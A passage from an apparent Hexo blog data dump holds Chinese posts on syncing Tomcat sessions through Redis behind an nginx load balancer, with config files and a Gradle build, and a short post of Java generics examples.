class=\"line\">            name &apos;MIT&apos;</span><br><span class=\"line\">            url &apos;http://opensource.org/licenses/MIT&apos;</span><br><span class=\"line\">            distribution &apos;repo&apos;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>tomcat6版本在部署时，className名字和tomcat7版本不一样<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;Valve className=&quot;com.radiadesign.catalina.session.RedisSessionHandlerValve&quot; /&gt;</span><br><span class=\"line\">&lt;Manager className=&quot;com.radiadesign.catalina.session.RedisSessionManager&quot;</span><br><span class=\"line\">         host=&quot;localhost&quot; &lt;!-- optional: defaults to &quot;localhost&quot; --&gt;</span><br><span class=\"line\">         port=&quot;6379&quot; &lt;!-- optional: defaults to &quot;6379&quot; --&gt;</span><br><span class=\"line\">         database=&quot;0&quot; &lt;!-- optional: defaults to &quot;0&quot; --&gt;</span><br><span class=\"line\">         maxInactiveInterval=&quot;60&quot; &lt;!-- optional: defaults to &quot;60&quot; (in seconds) --&gt; /&gt;</span><br></pre></td></tr></table></figure></p>\n<p>如果还报configure XXX.xml错误<br><br>到tomcat/conf/Catalina/localhost目录下，只保留你的项目.xml</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-需求\"><a href=\"#1-需求\" class=\"headerlink\" title=\"1.需求\"></a>1.需求</h4><p>不同Ip主机上的tomcat,保持session同步。<br></p>\n<h4 id=\"2-查资料\"><a href=\"#2-查资料\" class=\"headerlink\" title=\"2.查资料\"></a>2.查资料</h4><p>一般做法为，利用redis保持session,不同tomcat从redis存取，外层nginx做tomcat的负载均衡。<br><br>开源项目<a href=\"https://github.com/jcoleman/tomcat-redis-session-manager，\" target=\"_blank\" rel=\"noopener\">https://github.com/jcoleman/tomcat-redis-session-manager，</a> 提供了tomcat连接redis的jar包，但是，我试了多次，总是不行，版本不对，或者class找不到等。<br><br>解决方案参照：<a href=\"https://my.oschina.net/Listening/blog/674759\" target=\"_blank\" rel=\"noopener\">https://my.oschina.net/Listening/blog/674759</a>, 直接用gradle生成jar包。</p>\n<h4 id=\"3-实现\"><a href=\"#3-实现\" class=\"headerlink\" title=\"3.实现\"></a>3.实现</h4><p>tomcat7.0.61/nginx1.10.3/ubuntu虚拟机</p>\n<h6 id=\"1-tomcat\"><a href=\"#1-tomcat\" class=\"headerlink\" title=\"1.tomcat\"></a>1.tomcat</h6><ul>\n<li>解压两个tomcat到两个虚拟机</li>\n<li>conf/server.xml更改端口，使之不重复</li>\n<li>添加index.jsp到 webapps/Root目录下</li>\n<li>分别启动tomcat,看看是否正常<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;  </span><br><span class=\"line\">&lt;%  </span><br><span class=\"line\">String path = request.getContextPath();  </span><br><span class=\"line\">String basePath = request.getScheme()+&quot;://&quot;+request.getServerName()+&quot;:&quot;+request.getServerPort()+path+&quot;/&quot;;  </span><br><span class=\"line\">%&gt;  </span><br><span class=\"line\">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;  </span><br><span class=\"line\">&lt;html&gt;  </span><br><span class=\"line\">  &lt;head&gt;  </span><br><span class=\"line\">    &lt;base href=&quot;&lt;%=basePath%&gt;&quot;&gt;  </span><br><span class=\"line\">    &lt;title&gt;My JSP &apos;index.jsp&apos; starting page&lt;/title&gt;  </span><br><span class=\"line\">    &lt;meta http-equiv=&quot;pragma&quot; content=&quot;no-cache&quot;&gt;  </span><br><span class=\"line\">    &lt;meta http-equiv=&quot;cache-control&quot; content=&quot;no-cache&quot;&gt;  </span><br><span class=\"line\">    &lt;meta http-equiv=&quot;expires&quot; content=&quot;0&quot;&gt;      </span><br><span class=\"line\">    &lt;meta http-equiv=&quot;keywords&quot; content=&quot;keyword1,keyword2,keyword3&quot;&gt;  </span><br><span class=\"line\">    &lt;meta http-equiv=&quot;description&quot; content=&quot;This is my page&quot;&gt;  </span><br><span class=\"line\">    &lt;!--</span><br><span class=\"line\">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;styles.css&quot;&gt;</span><br><span class=\"line\">    --&gt;  </span><br><span class=\"line\">  &lt;/head&gt;  </span><br><span class=\"line\">  &lt;body&gt;  </span><br><span class=\"line\">        SessionID:&lt;%=session.getId()%&gt;  </span><br><span class=\"line\">        &lt;BR&gt;  </span><br><span class=\"line\">        SessionIP:&lt;%=request.getServerName()%&gt;  </span><br><span class=\"line\">        &lt;BR&gt;  </span><br><span class=\"line\">        SessionPort:&lt;%=request.getServerPort()%&gt;  </span><br><span class=\"line\">        &lt;%  </span><br><span class=\"line\">        out.println(&quot;This is Tomcat Server 22222&quot;);  </span><br><span class=\"line\">        %&gt;  </span><br><span class=\"line\">  &lt;/body&gt;  </span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h6 id=\"2-nginx\"><a href=\"#2-nginx\" class=\"headerlink\" title=\"2.nginx\"></a>2.nginx</h6><p>编辑/etc/nginx/nginx.conf 添加tomcat配置<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">user www-data;</span><br><span class=\"line\">worker_processes auto;</span><br><span class=\"line\">pid /run/nginx.pid;</span><br><span class=\"line\"></span><br><span class=\"line\">events &#123;</span><br><span class=\"line\">\tworker_connections 768;</span><br><span class=\"line\">\t# multi_accept on;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">http &#123;</span><br><span class=\"line\"> .......</span><br><span class=\"line\">\tinclude /etc/nginx/conf.d/*.conf;</span><br><span class=\"line\">\tinclude /etc/nginx/sites-enabled/*;</span><br><span class=\"line\"></span><br><span class=\"line\">upstream tomcat&#123;</span><br><span class=\"line\">\t#ip_hash;</span><br><span class=\"line\">\tserver   192.168.93.132:8081\tweight=1;</span><br><span class=\"line\">\tserver   192.168.93.133:8080\tweight=1;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">server&#123;</span><br><span class=\"line\">\tlisten 80;</span><br><span class=\"line\">\tserver_name localhost 127.0.0.1;</span><br><span class=\"line\">            location / &#123;</span><br><span class=\"line\">                root    html;</span><br><span class=\"line\">                index   index.jsp;</span><br><span class=\"line\">                proxy_pass      http://tomcat;</span><br><span class=\"line\">                proxy_set_header        X-Real-IP       $remote_addr;</span><br><span class=\"line\">                client_max_body_size    100m;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">........</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"3-redis\"><a href=\"#3-redis\" class=\"headerlink\" title=\"3.redis\"></a>3.redis</h6><p>这一步很坑，参照：<a href=\"https://my.oschina.net/Listening/blog/674759\" target=\"_blank\" rel=\"noopener\">https://my.oschina.net/Listening/blog/674759</a>, 进行配置<br></p>\n<p>将生成的jar包全部放入tomcat/lib/目录下<br><br>编辑tomcat/conf/content.xml文件,添加<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;Context&gt;</span><br><span class=\"line\">    ........</span><br><span class=\"line\">    &lt;!--</span><br><span class=\"line\">    &lt;Valve className=&quot;org.apache.catalina.valves.CometConnectionManagerValve&quot; /&gt;</span><br><span class=\"line\">    --&gt;</span><br><span class=\"line\">&lt;Valve className=&quot;com.orangefunction.tomcat.redissessions.RedisSessionHandlerValve&quot; /&gt;</span><br><span class=\"line\">&lt;Manager className=&quot;com.orangefunction.tomcat.redissessions.RedisSessionManager&quot;</span><br><span class=\"line\">    host=&quot;127.0.0.1&quot; //注意这里，应该是redis地址</span><br><span class=\"line\">    port=&quot;6379&quot;</span><br><span class=\"line\">    database=&quot;0&quot;</span><br><span class=\"line\">    maxInactiveInterval=&quot;60&quot;</span><br><span class=\"line\">/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/Context&gt;</span><br></pre></td></tr></table></figure></p>\n<p>在这里可能会出现redis连接不上问题，原因是/etc/redis/redis.conf 文件里默认配置为 bind 127.0.0.1, 改为 0.0.0.0<br><br>除此之外也有可能防火墙原因.<br><br>重启 redis-server /etc/redis/redis.conf <br><br>查看是否监听0.0.0.0:6379端口 ps -ef | grep redis<br><img src=\"../../images/redis.png\" alt=\"redisport\"></p>\n<h4 id=\"4-重启tomcat-查看效果\"><a href=\"#4-重启tomcat-查看效果\" class=\"headerlink\" title=\"4. 重启tomcat 查看效果\"></a>4. 重启tomcat 查看效果</h4><p><img src=\"../../images/tomcat1.png\" alt=\"redisport\"><br><img src=\"../../images/tomcat2.png\" alt=\"redisport\"></p>\n<p>可以看到现在session已经保持不变</p>\n<h4 id=\"5-2018-12-26补充\"><a href=\"#5-2018-12-26补充\" class=\"headerlink\" title=\"5.2018-12-26补充\"></a>5.2018-12-26补充</h4><p>公司项目是用的tomcat6部署，所以直接用上面打包好的jar包会报:java.lang.AbstractMethodError错误，意思是jar包冲突。<br><br>解决办法:<br><br>去github上下载tomcat6的分支，重新打包,将dist目录下所有jar包和bulid/lib目录下的tomcat-redis-session-XXXX.jar放到tomcat的lib目录下<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apply plugin: &apos;java&apos;</span><br><span class=\"line\">apply plugin: &apos;maven&apos;</span><br><span class=\"line\">apply plugin: &apos;signing&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">group = &apos;com.orangefunction&apos;</span><br><span class=\"line\">version = &apos;1.2.0&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">repositories &#123;</span><br><span class=\"line\">  mavenCentral()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">compileJava &#123;</span><br><span class=\"line\">  sourceCompatibility = 1.7</span><br><span class=\"line\">  targetCompatibility = 1.7</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">dependencies &#123;</span><br><span class=\"line\">  //compile group: &apos;org.apache.tomcat&apos;, name: &apos;tomcat-catalina&apos;,</span><br><span class=\"line\">   version: &apos;6.0.37&apos;</span><br><span class=\"line\">  //用tomcat6.0.37的jar打包</span><br><span class=\"line\">  compile fileTree(dir: &apos;pathto/your/tomcat6.0.37/lib&apos;, include: [&apos;*.jar&apos;])</span><br><span class=\"line\">  compile group: &apos;redis.clients&apos;, name: &apos;jedis&apos;, version: &apos;2.5.2&apos;</span><br><span class=\"line\">  compile group: &apos;org.apache.commons&apos;, name: &apos;commons-pool2&apos;, version: &apos;2.2&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">  testCompile group: &apos;junit&apos;, name: &apos;junit&apos;, version: &apos;4.+&apos;</span><br><span class=\"line\">  testCompile &apos;org.hamcrest:hamcrest-core:1.3&apos;</span><br><span class=\"line\">  testCompile &apos;org.hamcrest:hamcrest-library:1.3&apos;</span><br><span class=\"line\">  testCompile &apos;org.mockito:mockito-all:1.9.5&apos;</span><br><span class=\"line\">  testCompile group: &apos;org.apache.tomcat&apos;, name: &apos;tomcat-coyote&apos;, version: &apos;6.0.37&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">task javadocJar(type: Jar, dependsOn: javadoc) &#123;</span><br><span class=\"line\">  classifier = &apos;javadoc&apos;</span><br><span class=\"line\">  from &apos;build/docs/javadoc&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">task sourcesJar(type: Jar) &#123;</span><br><span class=\"line\">  from sourceSets.main.allSource</span><br><span class=\"line\">  classifier = &apos;sources&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">artifacts &#123;</span><br><span class=\"line\">  archives jar</span><br><span class=\"line\"></span><br><span class=\"line\">  archives javadocJar</span><br><span class=\"line\">  archives sourcesJar</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">task copyJars(type: Copy) &#123;</span><br><span class=\"line\">  from configurations.runtime</span><br><span class=\"line\">  into &apos;dist&apos;  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">uploadArchives &#123;</span><br><span class=\"line\">  repositories &#123;</span><br><span class=\"line\">    mavenDeployer &#123;</span><br><span class=\"line\">      beforeDeployment &#123; MavenDeployment deployment -&gt; signing.signPom(deployment) &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">      pom.project &#123;</span><br><span class=\"line\">        name &apos;tomcat-redis-session-manager&apos;</span><br><span class=\"line\">        packaging &apos;jar&apos;</span><br><span class=\"line\">        description &apos;Tomcat Redis Session Manager is a Tomcat extension to store sessions in Redis&apos;</span><br><span class=\"line\">        url &apos;https://github.com/jcoleman/tomcat-redis-session-manager&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">        issueManagement &#123;</span><br><span class=\"line\">          url &apos;https://github.com:jcoleman/tomcat-redis-session-manager/issues&apos;</span><br><span class=\"line\">          system &apos;GitHub Issues&apos;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        scm &#123;</span><br><span class=\"line\">          url &apos;https://github.com:jcoleman/tomcat-redis-session-manager&apos;</span><br><span class=\"line\">          connection &apos;scm:git:git://github.com/jcoleman/tomcat-redis-session-manager.git&apos;</span><br><span class=\"line\">          developerConnection &apos;scm:git:git@github.com:jcoleman/tomcat-redis-session-manager.git&apos;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        licenses &#123;</span><br><span class=\"line\">          license &#123;</span><br><span class=\"line\">            name &apos;MIT&apos;</span><br><span class=\"line\">            url &apos;http://opensource.org/licenses/MIT&apos;</span><br><span class=\"line\">            distribution &apos;repo&apos;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>tomcat6版本在部署时，className名字和tomcat7版本不一样<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;Valve className=&quot;com.radiadesign.catalina.session.RedisSessionHandlerValve&quot; /&gt;</span><br><span class=\"line\">&lt;Manager className=&quot;com.radiadesign.catalina.session.RedisSessionManager&quot;</span><br><span class=\"line\">         host=&quot;localhost&quot; &lt;!-- optional: defaults to &quot;localhost&quot; --&gt;</span><br><span class=\"line\">         port=&quot;6379&quot; &lt;!-- optional: defaults to &quot;6379&quot; --&gt;</span><br><span class=\"line\">         database=&quot;0&quot; &lt;!-- optional: defaults to &quot;0&quot; --&gt;</span><br><span class=\"line\">         maxInactiveInterval=&quot;60&quot; &lt;!-- optional: defaults to &quot;60&quot; (in seconds) --&gt; /&gt;</span><br></pre></td></tr></table></figure></p>\n<p>如果还报configure XXX.xml错误<br><br>到tomcat/conf/Catalina/localhost目录下，只保留你的项目.xml</p>\n"},{"title":"泛型","date":"2018-11-15T03:41:40.000Z","_content":"\n#### 1. <T\\>\n泛型<T> T可以为任意大写字母<br>\n可以多泛型<T,U>等<br>\n单独的<T>表示T为Object下的子类。<br>\n\n类型绑定: <T extends XXX> 表示T为继承XXX类型的子类<br>\n\n#### 2.例子\n\n###### 1.泛型类\n```\npublic class GenericDemo <T>{\n    public   T test(T t){\n        return t;\n    }\n\n    public static void main(String[] args){\n        GenericDemo<String> genericDemo = new GenericDemo<>();\n        System.out.println(genericDemo.test(\"aa\"));\n    }\n}\n\n```\n###### 2.泛型方法\n```\npublic class GenericMethod {\n    public static <T> T test(T t) {\n        return t;\n    }\n    public static  void  main(String[] args) {\n        System.out.println(test(\"aa\"));\n    }\n}\n\n```\n###### 3.泛型接口\n```\npublic interface GenericInterface <T,U> {\n    T test(U u);\n}\n\n\npublic class GenericInterfaceClass implements GenericInterface<String,String>{\n    @Override\n    public String test(String a){\n        return a;\n    }\n}\n\n```\n","source":"_posts/java/泛型.md","raw":"---\ntitle: 泛型\ndate: 2018-11-15 11:41:40\ntags: [java]\n---\n\n#### 1. <T\\>\n泛型<T> T可以为任意大写字母<br>\n可以多泛型<T,U>等<br>\n单独的<T>表示T为Object下的子类。<br>\n\n类型绑定: <T extends XXX> 表示T为继承XXX类型的子类<br>\n\n#### 2.例子\n\n###### 1.泛型类\n```\npublic class GenericDemo <T>{\n    public   T test(T t){\n        return t;\n    }\n\n    public static void main(String[] args){\n        GenericDemo<String> genericDemo = new GenericDemo<>();\n        System.out.println(genericDemo.test(\"aa\"));\n    }\n}\n\n```\n###### 2.泛型方法\n```\npublic class GenericMethod {\n    public static <T> T test(T t) {\n        return t;\n    }\n    public static  void  main(String[] args) {\n        System.out.println(test(\"aa\"));\n    }\n}\n\n```\n###### 3.泛型接口\n```\npublic interface GenericInterface <T,U> {\n    T test(U u);\n}\n\n\npublic class GenericInterfaceClass implements GenericInterface<String,String>{\n    @Override\n    public String test(String a){\n        return a;\n    }\n}\n\n```\n","slug":"java/泛型","published":1,"updated":"2019-01-21T09:08:10.659Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr640522001c6cvpuj0b2881","content":"<h4 id=\"1-lt-T\"><a href=\"#1-lt-T\" class=\"headerlink\" title=\"1. &lt;T>\"></a>1. &lt;T></h4><p>泛型<t> T可以为任意大写字母<br><br>可以多泛型&lt;T,U&gt;等<br><br>单独的<t>表示T为Object下的子类。<br></t></t></p>\n<p>类型绑定: <t extends=\"\" xxx=\"\"> 表示T为继承XXX类型的子类<br></t></p>\n<h4 id=\"2-例子\"><a href=\"#2-例子\" class=\"headerlink\" title=\"2.例子\"></a>2.例子</h4><h6 id=\"1-泛型类\"><a href=\"#1-泛型类\" class=\"headerlink\" title=\"1.泛型类\"></a>1.泛型类</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class GenericDemo &lt;T&gt;&#123;</span><br><span class=\"line\">    public   T test(T t)&#123;</span><br><span class=\"line\">        return t;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\">        GenericDemo&lt;String&gt; genericDemo = new GenericDemo&lt;&gt;();</span><br><span class=\"line\">        System.out.println(genericDemo.test(&quot;aa&quot;));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"2-泛型方法\"><a href=\"#2-泛型方法\" class=\"headerlink\" title=\"2.泛型方法\"></a>2.泛型方法</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class GenericMethod &#123;</span><br><span class=\"line\">    public static &lt;T&gt; T test(T t) &#123;</span><br><span class=\"line\">        return t;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public static  void  main(String[] args) &#123;</span><br><span class=\"line\">        System.out.println(test(&quot;aa&quot;));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"3-泛型接口\"><a href=\"#3-泛型接口\" class=\"headerlink\" title=\"3.泛型接口\"></a>3.泛型接口</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public interface GenericInterface &lt;T,U&gt; &#123;</span><br><span class=\"line\">    T test(U u);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">public class GenericInterfaceClass implements GenericInterface&lt;String,String&gt;&#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public String test(String a)&#123;</span><br><span class=\"line\">        return a;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-lt-T\"><a href=\"#1-lt-T\" class=\"headerlink\" title=\"1. &lt;T>\"></a>1. &lt;T></h4><p>泛型<t> T可以为任意大写字母<br><br>可以多泛型&lt;T,U&gt;等<br><br>单独的<t>表示T为Object下的子类。<br></t></t></p>\n<p>类型绑定: <t extends=\"\" xxx=\"\"> 表示T为继承XXX类型的子类<br></t></p>\n<h4 id=\"2-例子\"><a href=\"#2-例子\" class=\"headerlink\" title=\"2.例子\"></a>2.例子</h4><h6 id=\"1-泛型类\"><a href=\"#1-泛型类\" class=\"headerlink\" title=\"1.泛型类\"></a>1.泛型类</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class GenericDemo &lt;T&gt;&#123;</span><br><span class=\"line\">    public   T test(T t)&#123;</span><br><span class=\"line\">        return t;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\">        GenericDemo&lt;String&gt; genericDemo = new GenericDemo&lt;&gt;();</span><br><span class=\"line\">        System.out.println(genericDemo.test(&quot;aa&quot;));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"2-泛型方法\"><a href=\"#2-泛型方法\" class=\"headerlink\" title=\"2.泛型方法\"></a>2.泛型方法</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class GenericMethod &#123;</span><br><span class=\"line\">    public static &lt;T&gt; T test(T t) &#123;</span><br><span class=\"line\">        return t;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public static  void  main(String[] args) &#123;</span><br><span class=\"line\">        System.out.println(test(&quot;aa&quot;));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"3-泛型接口\"><a href=\"#3-泛型接口\" class=\"headerlink\" title=\"3.泛型接口\"></a>3.泛型接口</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public interface GenericInterface &lt;T,U&gt; &#123;</span><br><span class=\"line\">    T test(U u);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">public class GenericInterfaceClass implements GenericInterface&lt;String,String&gt;&#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public String test(String a)&#123;</span><br><span class=\"line\">        return a;</span><br><span class=\"line\">    &#125;</span><br><span 